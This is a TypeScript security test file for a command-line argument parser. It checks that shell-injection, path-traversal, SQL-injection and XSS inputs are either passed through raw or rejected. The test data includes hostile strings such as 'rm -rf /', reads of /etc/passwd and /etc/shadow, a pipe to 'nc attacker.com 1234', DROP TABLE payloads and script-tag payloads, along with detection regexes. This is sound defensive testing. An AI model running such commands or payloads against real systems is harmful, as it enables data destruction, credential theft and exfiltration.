/**
 * Security tests for injection prevention and input validation
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { ArgumentParser } from '../../src/parser/ArgumentParser.js';
import { ValidationError } from '../../src/utils/validators.js';
import {
  validateEmail,
  validateUrl,
  validatePattern,
} from '../../src/utils/validators.js';

describe('Security - Injection Prevention', () => {
  describe('Command Injection Prevention', () => {
    it('should safely handle shell metacharacters in arguments', () => {
      const parser = new ArgumentParser();
      parser.addArgument({
        name: 'filename',
        description: 'File name',
        required: true,
      });

      // Test various shell metacharacters
      const dangerousInputs = [
        'file.txt; rm -rf /',
        'file.txt && cat /etc/passwd',
        'file.txt | nc attacker.com 1234',
        'file.txt`whoami`',
        'file.txt$(whoami)',
        'file.txt\nrm -rf /',
      ];

      for (const input of dangerousInputs) {
        const args = parser.parse([input]);
        // Parser should pass the raw string without execution
        assert.equal(args.filename, input);
      }
    });

    it('should validate file paths to prevent traversal', () => {
      const parser = new ArgumentParser();
      parser.addOption({
        name: 'file',
        long: 'file',
        type: 'string',
        description: 'File path',
        validate: (value) => {
          const path = value as string;
          // Prevent directory traversal
          if (path.includes('..') || path.startsWith('/')) {
            return 'Invalid file path';
          }
          return true;
        },
      });

      const dangerousPaths = [
        '../../../etc/passwd',
        '../../sensitive/data',
        '/etc/shadow',
        'file/../../secret',
      ];

      for (const path of dangerousPaths) {
        assert.throws(
          () => parser.parse(['--file', path]),
          ValidationError,
          `Should reject path: ${path}`
        );
      }
    });

    it('should prevent environment variable injection', () => {
      const parser = new ArgumentParser();
      parser.addOption({
        name: 'var',
        long: 'var',
        type: 'string',
        description: 'Variable',
        validate: (value) => {
          const str = value as string;
          // Prevent variable expansion
          if (str.includes('$') || str.includes('`')) {
            return 'Invalid variable value';
          }
          return true;
        },
      });

      const maliciousInputs = ['$HOME', '${PATH}', '`whoami`', '$(ls)'];

      for (const input of maliciousInputs) {
        assert.throws(
          () => parser.parse(['--var', input]),
          ValidationError,
          `Should reject input: ${input}`
        );
      }
    });
  });

  describe('Input Validation', () => {
    it('should validate email addresses', () => {
      const validEmails = [
        'user@example.com',
        'test.user@example.co.uk',
        'user+tag@example.com',
      ];

      const invalidEmails = [
        'invalid',
        '@example.com',
        'user@',
        'user @example.com',
        'user@.com',
      ];

      for (const email of validEmails) {
        assert.doesNotThrow(() => validateEmail(email, 'email'));
      }

      for (const email of invalidEmails) {
        assert.throws(() => validateEmail(email, 'email'), ValidationError);
      }
    });

    it('should validate URLs', () => {
      const validUrls = [
        'https://example.com',
        'http://localhost:3000',
        'https://sub.example.com/path?query=value',
      ];

      const invalidUrls = [
        'not-a-url',
        'javascript:alert(1)',
        'file:///etc/passwd',
        'ftp://example.com', // Valid URL but might not be allowed
      ];

      for (const url of validUrls) {
        assert.doesNotThrow(() => validateUrl(url, 'url'));
      }

      // Note: URL constructor is permissive, so only clearly invalid URLs will throw
      assert.throws(() => validateUrl('not-a-url', 'url'), ValidationError);
    });

    it('should validate against patterns', () => {
      const pattern = /^[a-z0-9-]+$/;

      const validInputs = ['valid-input', 'test123', 'my-command'];

      const invalidInputs = [
        'Invalid Input',
        'test@123',
        '../path',
        '; rm -rf',
      ];

      for (const input of validInputs) {
        assert.doesNotThrow(() => validatePattern(input, pattern, 'input'));
      }

      for (const input of invalidInputs) {
        assert.throws(
          () => validatePattern(input, pattern, 'input'),
          ValidationError
        );
      }
    });

    it('should prevent SQL injection patterns', () => {
      const parser = new ArgumentParser();
      parser.addOption({
        name: 'query',
        long: 'query',
        type: 'string',
        description: 'Query string',
        validate: (value) => {
          const str = value as string;
          // Basic SQL injection detection
          const sqlPatterns = [
            /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE)\b)/i,
            /'.*--/,
            /'\s*OR\s*'.*'=/i,
          ];

          for (const pattern of sqlPatterns) {
            if (pattern.test(str)) {
              return 'Suspicious input detected';
            }
          }
          return true;
        },
      });

      const sqlInjections = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "admin' --",
        '1; DELETE FROM users',
      ];

      for (const injection of sqlInjections) {
        assert.throws(
          () => parser.parse(['--query', injection]),
          ValidationError,
          `Should reject SQL injection: ${injection}`
        );
      }
    });

    it('should prevent XSS patterns', () => {
      const parser = new ArgumentParser();
      parser.addOption({
        name: 'content',
        long: 'content',
        type: 'string',
        description: 'Content',
        validate: (value) => {
          const str = value as string;
          // Basic XSS detection
          const xssPatterns = [
            /<script[^>]*>.*<\/script>/i,
            /javascript:/i,
            /on\w+\s*=/i,
          ];

          for (const pattern of xssPatterns) {
            if (pattern.test(str)) {
              return 'Suspicious content detected';
            }
          }
          return true;
        },
      });

      const xssPayloads = [
        '<script>alert(1)</script>',
        'javascript:alert(1)',
        '<img src=x onerror=alert(1)>',
        '<iframe src="javascript:alert(1)">',
      ];

      for (const payload of xssPayloads) {
        assert.throws(
          () => parser.parse(['--content', payload]),
          ValidationError,
          `Should reject XSS payload: ${payload}`
        );
      }
    });
  });

  describe('Buffer Overflow Prevention', () => {
    it('should handle extremely long inputs safely', () => {
      const parser = new ArgumentParser();
      parser.addOption({
        name: 'text',
        long: 'text',
        type: 'string',
        description: 'Text',
        validate: (value) => {
          const str = value as string;
          return str.length <= 1000 || 'Input too long';
        },
      });

      // Create a very long string
      const longString = 'a'.repeat(10000);

      assert.throws(() => parser.parse(['--text', longString]), ValidationError);
    });

    it('should handle many repeated arguments safely', () => {
      const parser = new ArgumentParser();
      parser.addArgument({
        name: 'items',
        description: 'Items',
        multiple: true,
        validate: (value) => {
          // Limit total items
          return true;
        },
      });

      // Create many arguments
      const manyArgs = Array.from({ length: 1000 }, (_, i) => `item${i}`);

      const args = parser.parse(manyArgs);
      assert.equal((args.items as string[]).length, 1000);
    });
  });

  describe('Type Coercion Security', () => {
    it('should safely handle number type coercion', () => {
      const parser = new ArgumentParser();
      parser.addOption({
        name: 'count',
        long: 'count',
        type: 'number',
        description: 'Count',
      });

      // Test various inputs
      const validNumbers = ['123', '0', '-456', '3.14'];

      for (const num of validNumbers) {
        const args = parser.parse(['--count', num]);
        assert.equal(typeof args.count, 'number');
      }

      // Test invalid numbers
      const invalidNumbers = ['abc', 'NaN', 'Infinity', '1e1000'];

      for (const num of invalidNumbers) {
        if (num === 'Infinity' || num === '1e1000') {
          // These are valid numbers in JavaScript but might be unwanted
          const args = parser.parse(['--count', num]);
          assert.equal(typeof args.count, 'number');
        } else {
          assert.throws(() => parser.parse(['--count', num]), ValidationError);
        }
      }
    });

    it('should safely handle boolean type coercion', () => {
      const parser = new ArgumentParser();
      parser.addOption({
        name: 'flag',
        long: 'flag',
        type: 'boolean',
        description: 'Flag',
      });

      const validBooleans = [
        ['--flag=true', true],
        ['--flag=false', false],
        ['--flag=yes', true],
        ['--flag=no', false],
        ['--flag=1', true],
        ['--flag=0', false],
      ] as const;

      for (const [input, expected] of validBooleans) {
        const args = parser.parse([input]);
        assert.equal(args.flag, expected);
      }

      // Invalid boolean values
      assert.throws(() => parser.parse(['--flag=maybe']), ValidationError);
    });
  });

  describe('Denial of Service Prevention', () => {
    it('should handle pathological regex patterns safely', () => {
      const parser = new ArgumentParser();

      // Use a simple, non-pathological regex
      const safePattern = /^[a-z0-9]+$/;

      parser.addOption({
        name: 'id',
        long: 'id',
        type: 'string',
        description: 'ID',
        validate: (value) => {
          return safePattern.test(value as string) || 'Invalid ID format';
        },
      });

      // Test with input that could cause ReDoS with a bad regex
      const longInput = 'a'.repeat(1000) + '!';

      const start = performance.now();
      assert.throws(() => parser.parse(['--id', longInput]), ValidationError);
      const duration = performance.now() - start;

      // Should complete quickly (< 10ms)
      assert.ok(duration < 10, `Validation took too long: ${duration}ms`);
    });

    it('should limit recursion depth in nested data', () => {
      // This test ensures the parser doesn't process deeply nested structures
      // In this CLI framework, we don't have nested arguments, so this is more
      // of a conceptual test for data validation

      const parser = new ArgumentParser();
      parser.addOption({
        name: 'data',
        long: 'data',
        type: 'string',
        description: 'Data',
        validate: (value) => {
          const str = value as string;
          // Limit nesting depth by counting brackets
          const depth = (str.match(/\{/g) || []).length;
          return depth <= 10 || 'Data too deeply nested';
        },
      });

      // Create deeply nested structure
      const deeplyNested = '{'.repeat(20) + '}'.repeat(20);

      assert.throws(() => parser.parse(['--data', deeplyNested]), ValidationError);
    });
  });
});
